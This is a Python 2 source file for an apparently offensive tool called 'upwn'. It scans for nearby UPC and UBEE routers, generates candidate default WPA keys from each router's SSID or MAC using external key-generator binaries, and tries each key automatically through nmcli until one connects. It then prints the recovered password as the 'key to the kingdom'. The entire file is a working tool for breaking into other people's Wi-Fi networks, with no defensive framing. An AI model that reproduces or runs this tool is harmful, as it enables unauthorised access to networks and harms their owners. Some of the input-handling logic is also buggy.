'''

Recently used or known WIFI networks will auto-connect and fuck up the program logic (key found - wrong)
reduce the globals madness

'''

from time import sleep
from subprocess import CalledProcessError
import subprocess
import re
import os
import sys
import time

ap_list = []
mac_list = []
ghz = 24
whatyearisit = 0
wifi_interface = ''
cntaps = 0
allkeys = 0

HEADER = '\033[95m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'


class upwn:
    '''
    PROGRAM LOGIC, function calls
    '''
    def menu(self):

        global wifi_interface
        global cntaps
        global allkeys
        isubee = 0

        upwn().checkroot()
        upwn().banner()
        aps, macs, ubees = upwn().getaps()
        upwn().getsetiface()
        listnr = upwn().setap(aps, macs)

        for item in ubees:
            if item == listnr:
                isubee = 1
                print OKGREEN + '[+] ' + "UBEE router detected" + ENDC

        prefix = upwn().serials()

        ubeekeys = upwn().gen_keys(listnr, 'UAAP')
        upwn().setghz()
        keys = upwn().gen_keys(listnr, prefix)

        print OKGREEN + "\nAvailable keys:" + ENDC

        if isubee:
            for item in ubeekeys:
                print OKGREEN + '[+] ' + ENDC + item
                allkeys += 1
        else:
            ubeekeys = []

        for item in keys:
            print OKGREEN + '[+] ' + ENDC + item
            allkeys += 1

        upwn().pretest(listnr, keys, ubeekeys)
        upwn().deadend()

    '''
    DEADEND
    '''
    def deadend(self):
        global allkeys, whatyearisit
        allkeys = 0
        whatyearisit = 0

        upwn().fail()
        response = raw_input(WARNING + "\nRetry? (Y/n): " + ENDC)

        if response in 'Yy' or '':
            upwn().menu()
        else:
            exit(0)

    '''
    SET GHZ
    '''
    def setghz(self):
        global ghz

        print OKGREEN + "\nAvailable band options:" + ENDC
        print "[0] 2.4 Ghz (default)"
        print "[1] 5 Ghz"
        print "[2] Both (may take a while)"

        response = raw_input(WARNING + "\nselect band: " + ENDC)

        if response == '':
            ghz = 1
            print OKGREEN + "[+] " + ENDC + "2.4 Ghz selected\n"
        elif int(response) == 0:
            ghz = 1
            print OKGREEN + "[+] " + ENDC + "2.4 Ghz selected\n"
        elif int(response) == 1:
            ghz = 2
            print OKGREEN + "[+] " + ENDC + "5 Ghz selected\n"
        elif int(response) == 2:
            ghz = 3
            print OKGREEN + "[+] " + ENDC + "2.4 + 5 Ghz selected\n"
        else:
            print "Your answer was bad and you should feel bad"
            exit(1)

    '''
    SET AP
    '''
    def setap(self, aps, macs):
        global cntaps

        print OKGREEN + "\nAvailable UPC routers:" + ENDC
        i = 0
        for item in aps:
            ap_list.append(item)
            if i == 0:
                print "[" + str(i) + "] " + str(item) + " (default)"
            else:
                print "[" + str(i) + "] " + str(item)
            cntaps += 1
            i += 1

        for item in macs:
            mac_list.append(item)

        listnr = 0
        response = raw_input(WARNING + "\nselect router: " + ENDC)

        if response == '':
            print OKGREEN + "[+] " + ENDC + ap_list[listnr] + " selected"
        elif int(response) <= cntaps:
            listnr = int(response)
            print OKGREEN + "[+] " + ENDC + ap_list[listnr] + " selected"
        else:
            print "Your answer was bad and you should feel bad"
            exit(1)

        return listnr


    '''
    SET WIFI INTERFACE
    '''
    def getsetiface(self):
        global wifi_interface

        print OKGREEN + "Wifi Interfaces found:" + ENDC

        iwconfig = subprocess.check_output("iwconfig", stderr=open(os.devnull, 'w'))
        interfaces = re.compile('(wlan+\d)').findall(iwconfig)

        i = 0
        for item in interfaces:
            if i == 0:
                print '[' + str(i) + ']  ' + str(item) + " (default)"
                i += 1
            else:
                print '[' + str(i) + ']  ' + str(item)
                i += 1

        response = raw_input(WARNING + "\nselect interface: " + ENDC)

        if response == '':
            wifi_interface = interfaces[0]

        elif response in '012345':
            wifi_interface = interfaces[int(response)]

        else:
            print "go away"
            exit(1)

        print OKGREEN + "[+]" + ENDC + " testing via " + str(wifi_interface) + "\n"

    '''
    GET APs
    '''
    def getaps(self):
        nmcli = subprocess.check_output(["nmcli", "-f", "SSID,BSSID", "d", "wifi"], stderr=open(os.devnull, 'w'))
        aps_macs = re.compile('(UPC+\d{7}).+(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)').findall(nmcli)

        aps_macs = set(aps_macs)

        aps = []
        macs = []
        ubees = []
        cnt = 0
        for item in aps_macs:
            aps.append(item[0])
            macs.append(item[1])
            if item[1][:8] == '64:7C:34':
                ubees.append(cnt)
            cnt += 1


        # exit if no UPC router is found
        if not aps:
            print FAIL + "[!] No vulnerable UPC routers found!" + ENDC
            print FAIL + "[+] Are you sure there are UPC routers around?" + ENDC
            print FAIL + "[+] If yes, try turning your WIFI off and on again." + ENDC
            print FAIL + "[+] Also try using a better Wifi dongle if the problem persists.\n" + ENDC
            exit(1)

        return aps, macs, ubees

    '''
    TEST THE KEYS?
    '''
    def pretest(self, listnr, keys, ubeekeys):

        response = raw_input(WARNING + "\nTry " + str(allkeys) + " keys now? [" + ap_list[listnr] + "] (Y/n): " + ENDC)

        if response in 'Yy' or '':

            if keys and ubeekeys:
                upwn().keytest(listnr, ubeekeys, wifi_interface)
                upwn().keytest(listnr, keys, wifi_interface)
            elif ubeekeys:
                upwn().keytest(listnr, ubeekeys, wifi_interface)
            else:
                upwn().keytest(listnr, keys, wifi_interface)
        else:
            exit(0)

    '''
    SET PREFIX
    '''
    def serials(self):

        print OKGREEN + "\n\nAvailable serial prefixes:" + ENDC
        print "[0] SAAP (default)"
        print "[1] SAPP"
        print "[2] SBAP"
        print "[3] all (may take a while)"
        response = raw_input(WARNING + "\nselect prefix: " + ENDC)

        prefix = ''

        if response == '':
            print OKGREEN + "[+] " + ENDC + "using SAAP\n"
            prefix = 'SAAP'

        elif int(response) == 0:
            print OKGREEN + "[+] " + ENDC + "using SAAP\n"
            prefix = 'SAAP'

        elif int(response) == 1:
            print OKGREEN + "[+] " + ENDC + "using SAPP\n"
            prefix = 'SAPP'

        elif int(response) == 2:
            print OKGREEN + "[+] " + ENDC + "using SBAP\n"
            prefix = 'SBAP'

        elif int(response) == 3:
            print OKGREEN + "[+] " + ENDC + "using SAAP,SAPP,SBAP\n"
            prefix = 'SAAP,SAPP,SBAP'
        else:
            print "Your answer was bad and you should feel bad"
            exit(1)

        return prefix

    '''
    NMCLI MAGIC
    '''
    def keytest(self, aplistnr, key, interface):

        global whatyearisit

        cnt = 0
        subprocess.Popen(['nmcli', 'connection', 'delete', 'id', ap_list[aplistnr]], stderr=open(os.devnull, 'wb'))

        for item in key:
            cnt += 1
            start_time = time.time()
            sys.stdout.write(OKGREEN + "\n[?] " + ENDC + item)
            sleep(2)

            p = subprocess.Popen(['nmcli', 'device', 'wifi', 'connect', ap_list[aplistnr], 'password', item, 'iface', interface], stderr=open(os.devnull, 'wb'))
            streamdata = p.communicate()[0]

            upwn().waiter(5)

            if p.returncode == 0:
                whatyearisit += (time.time() - start_time)
                upwn().win(aplistnr, item)

            sys.stdout.write(FAIL + "[X]" + ENDC)
            subprocess.Popen(['nmcli', 'connection', 'delete', 'id', ap_list[aplistnr]], stderr=open(os.devnull, 'wb'))

            whatyearisit += (time.time() - start_time)
            sys.stdout.write(" %s" % (time.time() - start_time) + "\t [" + str(cnt) + "/" + str(allkeys) + "]")
        print

    '''
    GET KEYS
    '''
    def gen_keys(self, aplistnr, prefix):
        global allkeys
        keys = []
        found = 0
        ubeekeys = ''

        # UAAP == UBEE
        if prefix == "UAAP":
            mac = str(mac_list[aplistnr]).replace(':', '')[6:]

            # hack for non zero return
            try:
                ubee = subprocess.check_output(["./ubee", mac], stderr=open(os.devnull, 'w'))
            except CalledProcessError as ex:
                ubee = ex.output

            ubeelines = ubee.splitlines()
            for line in ubeelines:
                if ap_list[aplistnr] in line:
                    ubeekeys = re.compile('([A-Z]{8})').findall(line)
                    found += 1

            if found == 0:
                ubeekeys = re.compile('([A-Z]{8})').findall(ubee)
            return ubeekeys

        # the rest
        output = subprocess.check_output(["./upc_keys_lambda", ap_list[aplistnr], prefix], stderr=open(os.devnull, 'w')).replace('\'', '')
        lines = output.splitlines()
        keys_ = (upwn().key_collector(lines))

        for item in keys_:
            keys.append(item)
        return keys

    '''
    COLLECT KEYS
    '''
    def key_collector(self, keys):
        collect = []

        if ghz == 3:
            for item in keys:
                parts = item.split(',')
                collect.append(parts[1])

        else:
            for item in keys:
                parts = item.split(',')
                if parts[2] == str(ghz):
                    collect.append(parts[1])
        return collect

    '''
    WAIT FOR IT.. now with dots
    '''
    def waiter(self, howlong):
        i = 1
        while i <= howlong:
            sys.stdout.write('.')
            sys.stdout.flush()
            sleep(1)
            i += 1

    '''
    ARE YOU ROOT?
    '''
    def checkroot(self):
        if os.getuid() != 0:
            print "You need root permissions to run this program"
            sys.exit(1)



    '''
    DEAD
    '''
    def fail(self):
        print "          _____                    _____                    _____                    _____           "
        print "         /\    \                  /\    \                  /\    \                  /\    \          "
        print "        /::\    \                /::\    \                /::\    \                /::\    \         "
        print "       /::::\    \              /::::\    \              /::::\    \              /::::\    \        "
        print "      /::::::\    \            /::::::\    \            /::::::\    \            /::::::\    \       "
        print "     /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \      "
        print "    /:::/  \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/  \:::\    \     "
        print "   /:::/    \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/    \:::\    \    "
        print "  /:::/    / \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/    / \:::\    \   "
        print " /:::/    /   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/    /   \:::\ ___\  "
        print "/:::/____/     \:::|    |/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/____/     \:::|    | "
        print "\:::\    \     /:::|____|\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\:::\    \     /:::|____| "
        print " \:::\    \   /:::/    /  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \:::\    \   /:::/    /  "
        print "  \:::\    \ /:::/    /    \:::\   \:::\    \               \::::::/    /    \:::\    \ /:::/    /   "
        print "   \:::\    /:::/    /      \:::\   \:::\____\               \::::/    /      \:::\    /:::/    /    "
        print "    \:::\  /:::/    /        \:::\   \::/    /               /:::/    /        \:::\  /:::/    /     "
        print "     \:::\/:::/    /          \:::\   \/____/               /:::/    /          \:::\/:::/    /      "
        print "      \::::::/    /            \:::\    \                  /:::/    /            \::::::/    /       "
        print "       \::::/    /              \:::\____\                /:::/    /              \::::/    /        "
        print "        \::/____/                \::/    /                \::/    /                \::/____/         "
        print "         ~~                       \/____/                  \/____/                  ~~               "

    '''
    START THE ENGINES
    '''
    def banner(self):
        print WARNING + "           _________   _...._                      _..._   "
        print "           \        |.'      '-.         _     _ .'     '. "
        print "            \        .'```'.    '. /\    \\\\   //.   .-.   ."
        print "             \      |       \     \`\\\\  //\\\\ // |  '   '  |"
        print "   _    _     |     |        |    |  \`//  \\'/  |  |   |  |"
        print "  | '  / |    |      \      /    .    \|   |/   |  |   |  |"
        print " .' | .' |    |     |\`'-.-'   .'      '        |  |   |  |"
        print " /  | /  |    |     | '-....-'`                 |  |   |  |"
        print "|   `'.  |   .'     '.                          |  |   |  |"
        print "'   .'|  '/'-----------'                        |  |   |  |"
        print " `-'  `--'                                      '--'   '--'" + ENDC
        print "\n"

    '''
    WE WIN THIS TIME
    '''
    def win(self, aplistnr, key):
        print '\n\n'
        print '   $$$$$\   $$$$$$\    $$$$$$\  $$\    $$\ $$$$$$$\   $$$$$$\ $$$$$$$$\ '
        print '   \__$$ | $$  __$$\  $$  __$$\ $$ |  $$  |$$  __$$\ $$  __$$\\\\__$$  __|'
        print '      $$ | $$ /  $$ | $$ /  \__|$$ | $$  / $$ |  $$ |$$ /  $$ |  $$ |'
        print '      $$ | $$$$$$$$ | $$ |      $$$$$   /  $$$$$$$  |$$ |  $$ |  $$ |'
        print ' $$\  $$ | $$  __$$ | $$ |      $$  $$ <   $$  ____/ $$ |  $$ |  $$ |'
        print ' $$ | $$ | $$ |  $$ | $$ |  $$\ $$ | \$$\  $$ |      $$ |  $$ |  $$ |'
        print ' \$$$$$$ | $$ |  $$ | \$$$$$$  |$$ |  \$$\ $$ |       $$$$$$  |  $$ |'
        print ' \______ / \__|  \__|  \______/ \__|   \__|\__|       \______ /  \__|'

        print "\n\n"
        print "Key to the kingdom of " + ap_list[aplistnr] + ":\t" + key
        print "\n\nThe castle was defeated in " + str(whatyearisit) + " seconds"
        exit(0)


'''
LETS GET THIS STARTED
'''
upwn().menu()
